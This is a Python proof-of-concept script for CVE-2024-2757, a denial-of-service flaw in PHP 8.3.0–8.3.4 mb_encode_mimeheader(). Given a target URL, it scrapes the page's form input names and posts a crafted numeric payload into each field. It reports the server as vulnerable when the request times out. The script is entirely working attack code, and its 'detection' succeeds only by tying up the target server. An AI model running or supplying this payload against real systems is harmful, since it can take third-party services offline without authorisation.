#! /usr/bin/python3
# CVE-2024-2757
# PHP mb_encode_mimeheader() DoS
# version : 8.3.0~8.3.4
# version(reg) : ^8\.3\.(0|1|2|3|4)$

import argparse 
import requests
from bs4 import BeautifulSoup

print('''================================\n         CVE-2024-2757\n PHP mb_encode_mimeheader() DoS\n================================''')

parser = argparse.ArgumentParser(usage="python3 CVE-2024-2757.py -u <Target URL>")
parser.add_argument("-u","--URL", required=True, help='Target server URL (e.g., http://localhost:8080/)')
args = parser.parse_args()


def find_input_form(URL):
    try:
        response = requests.get(URL)

        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            input_names = [input_tag.get('name') for input_tag in soup.find_all('input') if input_tag.get('name')]

            if len(input_names)>0:
                print(f"[+] find input_names : {input_names}\n")
                return input_names
            else:
                print("[-] No input tag found on the webpage")
                return False
        else:
            print("[-] Failed to load the webpage.")
            return False
    except requests.RequestException as e:
        print("[-] Failed to load the webpage.")
        return False


def Detected_Vulnerability(URL, NAME):
    for name in NAME:
        print(f"[+] try: {name} ... ",end='')

        #PoC
        body = {name: ",9868949,9868978,9869015,9689100,9869121,9869615,9870690,9867116,98558119861183. "}

        try:
            response = requests.post(url=URL, data=body, verify=False, timeout=5)
            if response.status_code == 200:
                print("no")

        except requests.Timeout:
            print("DoS!")
            print(f"[*] Detected Vulnerability : True\n")
            return True

    print(f"[-] Detected Vulnerability : False")
    return False


if __name__ == "__main__":
    URL=args.URL.rstrip("/")

    print("[+] Target URL : "+URL)
    
    input_names=find_input_form(URL)

    if input_names:
        Detected_Vulnerability(URL, input_names)